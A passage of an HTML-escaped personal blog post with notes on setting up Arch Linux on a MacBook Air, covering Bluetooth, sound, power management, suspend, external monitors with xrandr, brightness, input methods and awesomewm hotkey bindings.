    Option &amp;quot;ScrollDownButton&amp;quot;   &amp;quot;4&amp;quot;  
    Option &amp;quot;ScrollLeftButton&amp;quot;   &amp;quot;7&amp;quot;  
    Option &amp;quot;ScrollRightButton&amp;quot;  &amp;quot;6&amp;quot;  

    # Disable tap-to-click  
    # Option &amp;quot;TapButton1&amp;quot; &amp;quot;0&amp;quot;  
    # Option &amp;quot;TapButton2&amp;quot; &amp;quot;0&amp;quot;  
    # Option &amp;quot;TapButton3&amp;quot; &amp;quot;0&amp;quot;  
EndSection  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Bluetooth (Headset)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;https://wiki.archlinux.org/index.php/Bluetooth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Blueman"&gt;https://wiki.archlinux.org/index.php/Blueman&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth_headset"&gt;https://wiki.archlinux.org/index.php/Bluetooth_headset&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S bluez bluez-utils bluez-libs bluez-firmware blueman pulseaudio-bluetooth pulseaudio-alsa pavucontrol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo modprobe btusb&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl enable bluetooth&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl start bluetooth&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;blueman-manager&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;scan, pair, connect  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pavucontrol&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Change sound channel to bluetooth headset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sometimes the bluetooth device may be blocked  &lt;ul&gt;
&lt;li&gt;use &lt;code&gt;rfkill list&lt;/code&gt; to check if it is blocked.  &lt;/li&gt;
&lt;li&gt;use &lt;code&gt;sudo rfkill unblock bluetooth&lt;/code&gt; to unblock.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Sound&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xf86-video-intel alsa-utils&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;alsa-utils include alsamixer, amixer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Add the content below to &lt;code&gt;/etc/asound.conf&lt;/code&gt; //Important  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/asound.conf&lt;/code&gt; should be created after installed &lt;code&gt;pulseaudio-alsa&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/asound.conf  
---  
defaults.pcm.card 1  
defaults.pcm.device 0  
defaults.ctl.card 1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;awesomewm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S awesome vicious&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cp -r /usr/share/awesome/themes ~/.config/awesome/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Power Management&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Power_management"&gt;https://wiki.archlinux.org/index.php/Power_management&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave"&gt;https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;ACPI&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S acpi&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Powertop&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S powertop&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Create &lt;code&gt;/etc/systemd/system/powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Unit]  
Description=Powertop Service  
[Service]  
Type=oneshot  
ExecStart=/usr/bin/powertop --auto-tune  
[Install]  
WantedBy=multi-user.target  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl enable powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl start powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;cpupower&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/torvalds/linux/tree/master/tools/power/cpupower"&gt;https://github.com/torvalds/linux/tree/master/tools/power/cpupower&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pacman -S cpupower  
sudo systemctl enable cpupower  
sudo systemctl start cpupower  
sudo cpupower frequency-set -g powersave  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;thermald&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/01org/thermal_daemon"&gt;01org/thermal_daemon · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Thermal daemon for Intel Architecture  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S thermald  
sudo systemctl enable thermald  
sudo systemctl start thermald  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Fix the kworker CPU hug&lt;/h4&gt;
&lt;p&gt;"kworker" triggers some ACPI interrupts.&lt;br /&gt;
You can use &lt;code&gt;grep . -r /sys/firmware/acpi/interrupts/&lt;/code&gt; to check.&lt;br /&gt;
For me, &lt;code&gt;gpe4E&lt;/code&gt; triggered lots of ACPI interruptions.&lt;br /&gt;
So disable it via systemd.  &lt;/p&gt;
&lt;p&gt;Create &lt;code&gt;/etc/systemd/system/suppress-gpe4E.service&lt;/code&gt;&lt;br /&gt;
and add the following lines.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Unit]  
Description=Disables GPE 4E, an interrupt that is going crazy on Macs  
[Service]  
ExecStart=/usr/bin/bash -c &amp;#39;echo &amp;quot;disable&amp;quot; &amp;gt; /sys/firmware/acpi/interrupts/gpe4E&amp;#39;  
[Install]  
WantedBy=multi-user.target  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then enable and start it:&lt;br /&gt;
&lt;code&gt;sudo systemctl enable suppress-gpe4E.service&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;sudo systemctl start suppress-gpe4E.service&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;Enable power save mode on Intel Audio card&lt;/h4&gt;
&lt;p&gt;Create new hook:&lt;br /&gt;
&lt;code&gt;sudoedit /etc/modprobe.d/60-snd-hda-intel.conf&lt;/code&gt;&lt;br /&gt;
and add:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Enable Power Saving on Intel HDA Audio  
options snd_hda_intel power_save=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Enable powersaving options for Intel Processor&lt;/h4&gt;
&lt;p&gt;Create new hook:&lt;br /&gt;
&lt;code&gt;sudoedit /etc/modprobe.d/60-i915.conf&lt;/code&gt;&lt;br /&gt;
and add:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Experimental options to improve power saving on Intel Graphics  
options i915 enable_rc6=1 enable_fbc=1 lvds_downclock=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Suspend problem&lt;/h3&gt;
&lt;h4&gt;Prevent shutdown directly when power button is pressed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Repurpose_the_power_key"&gt;https://wiki.archlinux.org/index.php/MacBookPro11,x#Repurpose_the_power_key&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/systemd/logind.conf&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;HandlePowerKey=suspend&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Disable &lt;a href="https://en.wikipedia.org/wiki/Swappiness"&gt;Swappiness&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;To save SSD and avoid kswapd using lots of CPU resource on finding available swap when there's no more virtual memory can be used.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/igorpecovnik/lib/issues/219"&gt;kswapd 100% CPU-usage · Issue #219 · igorpecovnik/lib · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/sysctl/vm.txt"&gt;https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/sysctl/vm.txt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo sysctl vm.swappiness=0&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;The kernel will swap only to avoid an out of memory condition, when free memory will be below vm.min_free_kbytes limit. See the "VM Sysctl documentation"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo sysctl vm.min_free_kbytes=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudoedit /etc/sysctl.d/99-sysctl.conf&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Add &lt;code&gt;vm.swappiness=0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;vm.min_free_kbytes=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Fixing suspend mode&lt;/h4&gt;
&lt;p&gt;Use &lt;code&gt;cat /proc/acpi/wakeup&lt;/code&gt;.&lt;br /&gt;
There's a line saying &lt;code&gt;XHC1  S3  *enabled  pci:0000:00:14.0&lt;/code&gt;.&lt;br /&gt;
We only want the &lt;code&gt;LID0  S4  *enabled   platform:PNP0C0D:00&lt;/code&gt; to be enbaled.&lt;br /&gt;
So &lt;code&gt;sudoedit /etc/udev/rules.d/90-xhc_sleep.rules&lt;/code&gt; and add the follwing lines.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Disable wake from S3 on XHC1  
SUBSYSTEM==&amp;quot;pci&amp;quot;, KERNEL==&amp;quot;0000:00:14.0&amp;quot;, ATTR{device}==&amp;quot;0x9c31&amp;quot; RUN+=&amp;quot;/bin/sh -c &amp;#39;/bin/echo disabled &amp;gt; /sys$env{DEVPATH}/power/wakeup&amp;#39;&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Powersave&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Unia/powersave"&gt;GitHub - Unia/powersave: Linux power save settings, compatible with systemd&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/sysctl.d/99-powersave.conf  
---  
# Disable NMI watchdog  
kernel.nmi_watchdog = 0  

# laptop_mode is a knob that controls &amp;quot;laptop mode&amp;quot;. All the things that are controlled by this  
# knob are discussed in https://www.kernel.org/doc/Documentation/laptops/laptop-mode.txt (Default  
# is 0).  
vm.laptop_mode = 5  

# Contains, as a percentage of total available memory that contains free pages and reclaimable  
# pages, the number of pages at which a process which is generating disk writes will itself start  
# writing out dirty data (Default is 20).  
#vm.dirty_ratio = 20  

# Contains, as a percentage of total available memory that contains free pages and reclaimable  
# pages, the number of pages at which the background kernel flusher threads will start writing out  
# dirty data (Default is 10).  
#vm.dirty_background_ratio = 10  

# This tunable is used to define when dirty data is old enough to be eligible for writeout by the  
# kernel flusher threads.  It is expressed in 100&amp;#39;ths of a second.  Data which has been dirty  
# in-memory for longer than this interval will be written out next time a flusher thread wakes up  
# (Default is 3000).  
#vm.dirty_expire_centisecs = 3000  

# The kernel flusher threads will periodically wake up and write `old&amp;#39; data out to disk.  This  
# tunable expresses the interval between those wakeups, in 100&amp;#39;ths of a second (Default is 500).  
vm.dirty_writeback_centisecs = 1500  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/udev/rules.d/50-powersave-brightness.rules  
---  
# Display Power Management Signaling  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ENV{POWER_SUPPLY_ONLINE}==&amp;quot;0&amp;quot;, ENV{DISPLAY}=&amp;quot;DPY&amp;quot;, ENV{XAUTHORITY}=&amp;quot;/home/USER/.Xauthority&amp;quot;, RUN+=&amp;quot;/usr/bin/xset dpms 120 240 360&amp;quot;  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ENV{POWER_SUPPLY_ONLINE}==&amp;quot;1&amp;quot;, ENV{DISPLAY}=&amp;quot;DPY&amp;quot;, ENV{XAUTHORITY}=&amp;quot;/home/USER/.Xauthority&amp;quot;, RUN+=&amp;quot;/usr/bin/xset dpms 300 450 600&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/udev/rules.d/50-powersave-suspend.rules  
---  
# Suspend when battery is at 2%  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ATTR{status}==&amp;quot;Discharging&amp;quot;, ATTR{capacity}==&amp;quot;2&amp;quot;, RUN+=&amp;quot;/usr/bin/systemctl suspend&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Monitor&lt;/h3&gt;
&lt;h4&gt;Dual Display&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Multihead"&gt;https://wiki.archlinux.org/index.php/Multihead&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xrandr&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xrandr"&gt;https://wiki.archlinux.org/index.php/Xrandr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;xrandr should work.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For more friendly GUI setting, &lt;code&gt;sudo pacman -S lxrandr&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;But my 1920x1080 external display only get 1024x768 support&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xrandr#Adding_undetected_resolutions"&gt;https://wiki.archlinux.org/index.php/Xrandr#Adding_undetected_resolutions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cvt &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;1080&lt;/span&gt;  
&lt;span class="c1"&gt;# 1920x1080 59.96 Hz (CVT 2.07M9) hsync: 67.16 kHz; pclk: 173.00 MHz  &lt;/span&gt;
Modeline &lt;span class="s2"&gt;&amp;quot;1920x1080_60.00&amp;quot;&lt;/span&gt;  &lt;span class="m"&gt;173&lt;/span&gt;.00  &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;2248&lt;/span&gt; &lt;span class="m"&gt;2576&lt;/span&gt;  &lt;span class="m"&gt;1080&lt;/span&gt; &lt;span class="m"&gt;1083&lt;/span&gt; &lt;span class="m"&gt;1088&lt;/span&gt; &lt;span class="m"&gt;1120&lt;/span&gt; -hsync +vsync  

$ xrandr --newmode &lt;span class="s2"&gt;&amp;quot;1920x1080_60.00&amp;quot;&lt;/span&gt;  &lt;span class="m"&gt;173&lt;/span&gt;.00  &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;2248&lt;/span&gt; &lt;span class="m"&gt;2576&lt;/span&gt;  &lt;span class="m"&gt;1080&lt;/span&gt; &lt;span class="m"&gt;1083&lt;/span&gt; &lt;span class="m"&gt;1088&lt;/span&gt; &lt;span class="m"&gt;1120&lt;/span&gt; -hsync +vsync  

$ xrandr --addmode DP1 1920x1080_60.00  

$ xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;Hotplug problem - xrandr won't detect hotplug mini-display port to VGA adapter&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;I'm pretty sure that &lt;code&gt;udev&lt;/code&gt; indeed detect the hotplug event, but &lt;code&gt;xrandr&lt;/code&gt; always shows that &lt;code&gt;DP1&lt;/code&gt;(external VGA monitor) is disconnected.  &lt;/li&gt;
&lt;li&gt;This can be solved by adding mode for &lt;code&gt;DP1&lt;/code&gt; (check commands above).  &lt;/li&gt;
&lt;li&gt;After adding modes, just type &lt;code&gt;xrandr --output eDP1 --auto --output DP1 --mode ${mode_name} --left-of eDP1&lt;/code&gt; again, even if &lt;code&gt;xrandr&lt;/code&gt; still shows that &lt;code&gt;DP1&lt;/code&gt; is disconnected, it works.  &lt;/li&gt;
&lt;li&gt;So, add all modes we need (1920x1080, 1280x720, 1024x768, ...) can be a workaroud for this problem.  &lt;/li&gt;
&lt;li&gt;I think the problem is on &lt;code&gt;xrandr&lt;/code&gt; cannot recongnize whether thunderbolt to VGA adapter is connected or not when hotplug.  &lt;/li&gt;
&lt;li&gt;Add below to &lt;code&gt;.xinitrc&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;xrandr --newmode &amp;quot;1920x1080_60.00&amp;quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync  
xrandr --addmode DP1 1920x1080_60.00  

xrandr --newmode &amp;quot;1280x720_60.00&amp;quot;   74.50  1280 1344 1472 1664  720 723 728 748 -hsync +vsync  
xrandr --addmode DP1 1280x720_60.00  

xrandr --newmode &amp;quot;1024x768_60.00&amp;quot;   63.50  1024 1072 1176 1328  768 771 775 798 -hsync +vsync  
xrandr --addmode DP1 1024x768_60.00  

xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Birghtness&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xbacklight&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S mba6x_bl-dkms&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;(2016/12/02 update)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mba6x_bl-dkms&lt;/code&gt; now depends on &lt;code&gt;mba6x_bl_dkms-git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;mba6x_bl-dkms-git-48.055d50d-1&lt;/code&gt; doesn't work with &lt;code&gt;linux-4.8.11-1&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Need to use &lt;code&gt;sudo rmmod mba6x_bl&lt;/code&gt; to make &lt;code&gt;xbacklight&lt;/code&gt; work.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(optional) &lt;code&gt;yaourt -S lightum-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;For auto adjust keyboard and monitor birghtness by light sensor  &lt;/li&gt;
&lt;li&gt;The AUR version has bug, use this fork version &lt;a href="https://github.com/esoleyman/lightum"&gt;https://github.com/esoleyman/lightum&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;USB&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S pmount&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MikaelStrom/macfanctld"&gt;https://github.com/MikaelStrom/macfanctld&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yaourt -S macfanctld  
$ sudo systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; macfanctld  
$ sudo systemctl start macfanctld  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;IME&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S gcin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S libchewing&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for chewing input method  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S anthy&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for Japanese input method  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo gtk-query-immodules-2.0 --update-cache&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Browser&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S firefox firefox-i18n-zh-tw&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Flash  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S flashplugin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/flashblock/"&gt;https://addons.mozilla.org/en-US/firefox/addon/flashblock/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fonts&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S wqy-zenhei adobe-source-han-sans-tw-fonts&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mobile&lt;/h3&gt;
&lt;h4&gt;USB-Tethering (Works out of box)&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Android_tethering#USB_tethering"&gt;https://wiki.archlinux.org/index.php/Android_tethering#USB_tethering&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Disconnect from other networks  &lt;/li&gt;
&lt;li&gt;Connect phone to computer via USB cable  &lt;/li&gt;
&lt;li&gt;Enable the tethering option from the phone  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;ip link&lt;/code&gt; and search &lt;code&gt;usb?&lt;/code&gt; or &lt;code&gt;enp?s??u?&lt;/code&gt; interface  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo dhcpcd ${interface}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;ip link&lt;/code&gt; again to check if already got an ip on that interface  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Mount Android phone&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MTP"&gt;https://wiki.archlinux.org/index.php/MTP&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;install &lt;code&gt;libmtp&lt;/code&gt;, &lt;code&gt;android-file-transfer&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S libmtp  
$ yaourt -S android-file-transfer  

&lt;span class="o"&gt;(&lt;/span&gt;connect Android phone to Arch Linux via USB&lt;span class="o"&gt;)&lt;/span&gt;  

$ aft-mtp-mount ~/mnt   // mount android to ~/mnt  
$ fusermount -u ~/mnt   // unmount  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Webcam&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;[UPDATED] see the info below  &lt;/p&gt;
&lt;p&gt;The Facetime HD webcam (included on 2013 MBAs onwards) is no longer UVC device, and therefore, does not work out of the box.&lt;br /&gt;
It is actually a PCIE device.&lt;br /&gt;
While &lt;a href="https://github.com/patjak/bcwc_pcie"&gt;a bcwc_pcie driver is being developed&lt;/a&gt;, it will probably take some time before it is ready.&lt;br /&gt;
See also &lt;a href="https://bugzilla.kernel.org/show_bug.cgi?id=71131"&gt;Linux bug #71131&lt;/a&gt; and &lt;a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1276811"&gt;Ubuntu bug #1276711&lt;/a&gt;.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Webcam"&gt;https://wiki.archlinux.org/index.php/MacBook#Webcam&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(2017/12/08 update)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://aur.archlinux.org/packages/bcwc-pcie-git/"&gt;bcwc-pcie-git&lt;/a&gt; on AUR works.  &lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;yaourt -S bcwc-pcie-git&lt;/code&gt; or download the tarball and use &lt;code&gt;makepkg -s&lt;/code&gt; to install it.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Disable MacBook Firmware Boot Sound&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Arch_Linux_only"&gt;https://wiki.archlinux.org/index.php/MacBook#Arch_Linux_only&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The only special consideration is the MacBook firmware boot sound.&lt;br /&gt;
To ensure that this sound is off: mute the volume in OS X before continuing further.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I forgot to mute the volume before deleting the OS X.&lt;br /&gt;
So, I have to get an OS X installed on USB drive.&lt;br /&gt;
In order to mute the firmware boot sound and for the firmware updating in the furture.  &lt;/p&gt;
&lt;h3&gt;Hotkey Settings&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;xev&lt;/code&gt; to check the keymap  &lt;/li&gt;
&lt;li&gt;modify &lt;code&gt;rc.lua&lt;/code&gt; instead using &lt;code&gt;sxhkd&lt;/code&gt; if you are using awesomewm.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control"&gt;https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Add below to the globalkeys in &lt;code&gt;rc.lua&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-- MacBook Air function keys  
awful.key({ }, &amp;quot;XF86MonBrightnessDown&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xbacklight -dec 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86MonBrightnessUp&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xbacklight -inc 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86LaunchA&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86LaunchB&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --same-as eDP1&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86KbdBrightnessDown&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;kbdlight down 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86KbdBrightnessUp&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;kbdlight up 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86AudioMute&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 toggle&amp;quot;)  
    end  
),  
